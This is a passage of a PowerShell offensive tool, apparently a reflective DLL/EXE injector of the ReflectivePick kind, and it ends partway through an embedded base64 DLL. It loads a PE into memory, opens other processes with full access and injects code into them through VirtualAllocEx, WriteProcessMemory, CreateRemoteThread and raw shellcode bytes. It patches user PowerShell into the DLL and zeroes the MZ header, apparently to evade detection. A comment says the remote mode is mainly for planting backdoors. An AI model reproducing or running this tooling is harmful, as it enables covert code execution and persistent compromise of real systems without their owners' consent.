            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        #ASLR check
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ForceASLR) -and (-not $PESupportsASLR))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

        $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }       
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
        
        
        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#       {
#           Write-Verbose "Getting SeDebugPrivilege"
#           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#       }   
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        

        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        
        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
            write-verbose "64 Bit Injection"
        }
        else
        {
            [Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
            write-verbose "32 Bit Injection"
        }
        #REPLACING THE CALLBACK BYTES WITH YOUR OWN
        ##############
        
        # patch in the code bytes
        $RawBytes = Invoke-PatchDll -DllBytes $RawBytes -FindString "Invoke-Replace" -ReplaceString $PoshCode
        $PEBytes = $RawBytes
        
        #replace the MZ Header
        $PEBytes[0] = 0
        $PEBytes[1] = 0
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
        
        
        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        #Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Delete the PE file from memory.
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }
    Write-Verbose "PowerShell ProcessID: $PID"
    if ($ProcId)
    {
        Write-Verbose "Remote Process: $ProcID"
    }

    # REPLACE REFLECTIVEPICK DLLS HERE W/ BASE64-ENCODED VERSIONS!
    #   OR ELSE THIS SHIT WON'T WORK LOL
    $PEBytes64 = "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